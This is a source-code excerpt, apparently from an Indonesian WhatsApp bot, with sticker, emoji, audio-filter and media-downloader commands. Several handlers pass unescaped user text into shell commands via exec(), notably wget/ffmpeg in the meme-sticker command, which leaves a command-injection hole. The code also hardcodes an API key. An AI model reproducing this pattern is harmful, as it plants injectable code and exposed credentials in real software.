exec(`ffmpeg -i ${medoi} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(medoi)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
case 'imut':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(isQuotedAudio) { 
onlyWait() 
let masa = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${masa} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, async (err, stderr, stdout) => {
fs.unlinkSync(masa)
if (err) return setReply('Error!')
let buffer453 = fs.readFileSync(ran)
await xdev.sendMessage(from, {mimetype: 'audio/mp4', ptt: true, audio: buffer453}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
} else {
setReply('Reply audionya')
}
break
//━━━━━━━━━━━━━━━[ EMOJI ]━━━━━━━━━━━━━━━━━//
case 'emojiap':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Apple")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[0].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	            
case 'emojigo':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Google")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[1].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	             
case 'emojisa':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Samsung")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[2].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	             
case 'emojims':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Microsoft")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[3].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	             
case 'emojiwa':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji WhatsApp")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[4].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	
case 'emojitw':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Twitter")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[5].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	
case 'emojifb':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
setReply("Converting to emoji Facebook")
emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[6].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	
case 'emojijp':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji joypixel")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[7].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	       
case 'emojiom':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji openmoji")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[8].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	      
case 'emojied':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji emojidex")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[9].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	      
case 'emojimes':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji messenger")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[10].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	  
case 'emojilt':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji logitech")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[11].url}`
 xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break	  
case 'emojimo':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply('emojinya?')
await setReply("Converting to emoji mozila")
await emoji.get(`${args[0]}`).then(emoji => {
let teks = `${emoji.images[13].url}`
xdev.sendImageAsSticker(from, teks, setQuoted)
})
}
break
case 'emojimix': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await xdev.sendImageAsSticker(from, res.url, setQuoted)
}
}
break
//━━━━━━━━━━━━━━━[ STICKER ]━━━━━━━━━━━━━━━━━//
case 'sticker':  case 's':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isImage || isQuotedImage) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: setQuoted})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
if(err){ return}
var stream = await downloadContentFromMessage(dev.message.imageMessage || dev.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.jpg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./ACTION/PLICE/STICKER/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await xdev.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: setQuoted })
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else if (isVideo || isQuotedVideo) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 1, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: dev})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
var stream = await downloadContentFromMessage(dev.message.imageMessage || dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./ACTION/PLICE/STICKER/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await xdev.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: setQuoted })
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
case 'attp':
try {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length == 0) return setReply(`Example: ${prefix + command} XDEV`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await xdev.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: setQuoted })
} catch (e) {
console.log(e)
setReply(`Maap sedang error coba lagi besok`)            
}
break
case 'smeme': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
if (isQuotedImage ) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await xdev.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){
let olalah = await xdev.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await xdev.sendMessage(from,{sticker: fs.readFileSync(rano)}, {quoted: setQuoted})
await fs.unlinkSync(rano)
await fs.unlinkSync(ranp)
})
}
} else {
setReply('Gunakan foto!')
}
}
break
case 'triggered': case 'wasted': case 'comrade': case 'horny': case 'blur': case 'pixelate': case 'simpcard': case 'lolice': case 'glass':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isQuotedVideo && dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage.fileLength < 10000000 || isQuotedImage || isImage) {
onlyWait()
try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await xdev.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://some-random-api.ml/canvas/${command}?avatar=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){  
let owgi = await xdev.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(owgi)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await xdev.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: setQuoted})
await fs.unlinkSync(owgi)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
  
} else if (isQuotedText) {
onlyWait()

try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await xdev.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png') 
let media = `https://some-random-api.ml/canvas/${command}?avatar=${olalah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){  
console.log(err)
let oppp = await xdev.profilePictureUrl(mentionByReply, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${oppp}`
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await xdev.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: setQuoted})
await fs.unlinkSync(oppp)
await fs.unlinkSync(ranp)
await fs.unlinkSync(rano)
})
}
}  else {
setReply('Gunakan foto!')
}
break
case 'take':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (isImage || isQuotedImage|| isQuotedSticker) {
try{
let ahuh = args.join(' ').split('|')
let satu = ahuh[0] !== '' ? ahuh[0] : `${ownerName}`
let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: satu, // The pack name
author: dua, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: setQuoted})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
console.log(err)
}
}
break
case 'patrick':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
xdev.sendImageAsSticker(from, pjr, setQuoted)
}
)
break
case 'gura':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
xdev.sendImageAsSticker(from, pjr, setQuoted)
}
)
break
case 'doge':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
onlyWait()
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
//xdev.sendMedia (from, pjr, setQuoted, {caption: "Nih"})
xdev.sendImageAsSticker(from, pjr, setQuoted)
}
)
break
//━━━━━━━━━━━━━━━[ DOWNLOAD ]━━━━━━━━━━━━━━━━━//
case 'play':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply("Teksnya mana om")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let rus = await yts(q)
if (rus.all.length == "0") return setReply("Video tidak bisa di download")
let data = await rus.all.filter(v => v.type == 'video')
try{
var res = data[0]
var info = await ytdl.getInfo(res.url);
} catch{
var res = data[1]
var info = await ytdl.getInfo(res.url);
}
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
try{
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${res.videoId}/sqdefault.jpg`
}
let inithumb = await getBuffer(thumbnya)
let options2 =
{ 
externalAdReply: {
title: `⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻`, 
body: `   ━━━━⬤──────────    click here to play music `,
description: 'Now Playing...',
mediaType: 2,
thumbnail: inithumb,
mediaUrl: res.url,
sourceUrl: res.url
}
}   
var toks =`
📂 Judul : ${res.title}
🌐 Ditonton : ${h2k(res.views)} Kali 
⏳ Durasi : ${res.timestamp}
👤 Channel : ${res.author.name}
🎧 Audio : ${FileSize(audio[0].contentLength)} 
🎬 Video : ${FileSize(format.contentLength)}`

let aklo = [
{"buttonId": `${prefix}playmp3 ${res.url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res.url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
Sendbutdocument(from, `*YOUTUBE DOWNLOADER*\n${toks}`, fake, ofrply, aklo, options2)
}
break
case 'playmp3':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isUrl) return setReply("Masukan link")
try{
setReply("*Downloading...*")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
}
break
case 'playmp4':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if(format.contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload video lebih dari 10 menit")
}
setReply("*Downloading...*")
downloadMp4 (q) 
}
break
case 'playmusic':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
{
if (!q) return setReply("Masukan judul lagu")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
if(q.startsWith("https://")){
let nana = q.replace('https://m.', 'https://')
let scdl = await SoundCloud.create();
let res = await scdl.tracks.getTrack(nana)
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]

xdev.sendButImage(from, teks, fake, yamiyami, nano, {contextInfo: forward}) 

} else {

let scdl = await SoundCloud.create();
let result = await scdl.search({
query: q,
limit: 20, 
offset: 0, 
filter: 'tracks' 
});

let res = result.collection[0] 

try{
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err){
var artis = res.user.full_name
var album = "Tidak ada"
}
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
👤 Artis : ${artis}
💽 Album : ${album}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`

try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
xdev.sendButImage(from, teks, fake, yamiyami, nano, {contextInfo: forward}) 
}
}
break
case 'scmp3':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlMp3(nana)
}
break
case 'scdoc':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlDoc(nana)
}
break 
case 'ig':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
onlyWait()
if (!q) return setReply('Linknya?')
let igreel = q.includes("https://www.instagram.com/reel/")

if(igreel){
Download.insta_reel(q).then(async (data) => {
await xdev.sendMessage(from, {caption: `Nih`, video: {url: data.url} }, {quoted: setQuoted})
console.log(data)
console.log(data.url)
})
} else {
var { igDownloader } = require('../../../../../ACTION/STORAGE/X-FUNC/igdown')
res = await igDownloader(`${q}`).catch(e => {
return setReply(mess.error.api)
})
console.log(res)
xdev.sendMedia (from, res.result.link, setQuoted, {caption: "Nih"})
}
}
break
case 'gimage':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
try{
googleImage(q).then(async (data) => {
//console.log(data)
let foto = data[Math.floor(Math.random() * data.length)]
if(data.length == "0") return setReply("Image tidak di temukan")
onlyWait()
xdev.sendMedia (from, foto, setQuoted, {caption: "Nih"})
})
} catch(err){
let teks = args.join(' ')
let res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
xdev.sendMedia (from, random, setQuoted, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
}
}
}
}
break
case 'tiktokmusik':{    
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan()    
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
if (q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
onlyWait()
tiktokdlv2(lin).then( async res => {
let ep = res.video.no_watermark                    
let nana = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
xdev.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: setQuoted })
fs.unlinkSync(ran)
})
})
}
break
case 'tiktoknowm': 
case 'tiktok':{   
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await xdev.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => xdev.sendMessage(from, { delete: ko.key}), 4000)}
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
setReply(mess.wait)
tiktokdlv2(lin).then(res => {
let buttons = [
{"buttonId": `${prefix}tiktokmusik ${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
let ep = res.video.no_watermark
console.log(ep)
xdev.sendMessage(from, {caption: "Nih", video: {url: ep}, buttons},{quoted: setQuoted})
})
}
break
case 'pinterest':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (args.length < 2) return setReply(`Kirim perintah ${command} query atau ${command} query --jumlah\nContoh :\n${command} cecan atau ${command} cecan --10`)
onlyWait()
var jumlah;
if (q.includes('--')) jumlah = q.split('--')[1]
pinterest(q.replace('--'+jumlah, '')).then(async(data) => {
if (q.includes('--')) {
if (data.result.length < jumlah) {
jumlah = data.result.length
setReply(`Hanya ditemukan ${data.result.length}, foto segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
xdev.sendMessage(from, { image: { url: data.result[i] }})
}
} else {
var but = [{buttonId: `${command} ${q}`, buttonText: { displayText: 'Next Photo' }, type: 1 }]
xdev.sendMessage(from, { caption: `Hasil pencarian dari ${q}`, image: { url: pickRandom(data.result) }, buttons: but, footer: 'Pencet tombol dibawah untuk foto selanjutnya' }, { quoted: setQuoted })
}
})
break
case 'ytmp3':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
